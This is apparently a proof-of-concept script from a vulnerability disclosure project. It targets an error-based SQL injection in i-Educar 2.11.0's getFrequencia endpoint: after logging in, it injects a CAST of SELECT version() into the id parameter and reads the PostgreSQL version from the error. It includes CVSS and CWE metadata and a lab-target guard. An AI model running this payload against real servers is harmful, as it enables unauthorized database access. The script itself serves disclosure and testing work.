#!/usr/bin/env python3
"""VULN 13 — SQL injection in MatriculaController::getFrequencia().

`getFrequencia()` builds
`SELECT modules.frequencia_da_matricula({$cod_matricula});` from the raw `id`
request parameter. The PoC injects `CAST((SELECT version()) AS INT)` inside the
function argument; PostgreSQL returns the server version in the JSON error.
Read-only: the statement is a SELECT and aborts on the cast error.
"""

from __future__ import annotations

import json
import re
import sys
import urllib.parse
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from lib import credentials, evidence, http_util, lab_guard, poc_cli  # noqa: E402

VULN = {
    "id": "13",
    "slug": "matricula-frequencia-sql-injection",
    "title": "Error-based SQL injection in MatriculaController::getFrequencia() (id)",
    "product": "i-Educar",
    "affected_version": "2.11.0 (latest release, tag 2.11.0)",
    "cwe_id": "CWE-89",
    "cwe_name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
    "cwe_source_url": "https://cwe.mitre.org/data/definitions/89.html",
    "cwe_confidence": "high",
    "cwe_justification": (
        "The request id is concatenated into a SELECT function-call argument without "
        "binding or casting: CWE-89. CWE-564 is Hibernate-specific; the fact that the "
        "sink is inside a function call does not change the weakness class."
    ),
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
    "cvss_score": 8.8,
    "endpoint": "GET /module/Api/Matricula?oper=get&resource=frequencia",
    "params": ["id"],
    "precondition": "login (any authenticated profile; verified with admin)",
    "reported_at": "",
    "followups": [],
    "silence_days": 0,
    "status": "verified",
    "blocked_reason": "",
    "screenshots": [
        "evidence/screenshots/13-matricula-frequencia-sql-injection-01-version-leak.png",
    ],
    "advisory_url": "https://github.com/pollotherunner/i-explorar/blob/main/vulns/13-matricula-frequencia-sql-injection/README.md",
}

ADMIN = credentials.credentials("admin")
CONTROL_ID = "3"
INJECTION_ID = "CAST((SELECT version()) AS INT)"
BASE = "/module/Api/Matricula?oper=get&resource=frequencia&id="


def run(target: str, *, verbose: bool = False) -> dict:
    lab_guard.check_target(target)

    vuln_dir = Path(__file__).resolve().parent
    log = evidence.EvidenceLog(vuln_dir)
    notes: list[str] = []
    log.write(f"# target: {target}")

    client = http_util.HttpClient(target, verbose=verbose)
    client.login(*ADMIN)
    if not client.logged_in():
        log.close()
        return {"vulnerable": False, "evidence": [str(log.path)], "notes": "admin login failed"}

    control = client.get(BASE + urllib.parse.quote(CONTROL_ID))
    log.write("")
    log.write(f"### control: id={CONTROL_ID}")
    log.write(f"HTTP {control.status}")
    log.block("body", control.text.strip()[:500])

    injected = client.get(BASE + urllib.parse.quote(INJECTION_ID))
    log.write("")
    log.write(f"### injection: id={INJECTION_ID}")
    log.write(f"HTTP {injected.status}")
    log.block("body", injected.text.strip()[:1500])

    message = ""
    try:
        payload = json.loads(injected.text)
        for msg in payload.get("msgs", []):
            if "invalid input syntax" in msg.get("msg", ""):
                message = msg["msg"]
    except Exception:  # noqa: BLE001
        message = injected.text

    vulnerable = "invalid input syntax" in message and "PostgreSQL" in message
    version = ""
    if vulnerable:
        found = re.search(r"PostgreSQL \d+(?:\.\d+)?", message)
        version = found.group(0) if found else "PostgreSQL"
    notes.append(
        f"database version leaked through the function argument: {version}"
        if vulnerable
        else "no database error observed"
    )
    log.close()
    return {"vulnerable": vulnerable, "evidence": [str(log.path)], "notes": "; ".join(notes)}


def main(argv: list[str] | None = None) -> int:
    return poc_cli.poc_main(VULN, run, argv, __file__)


if __name__ == "__main__":
    sys.exit(main())
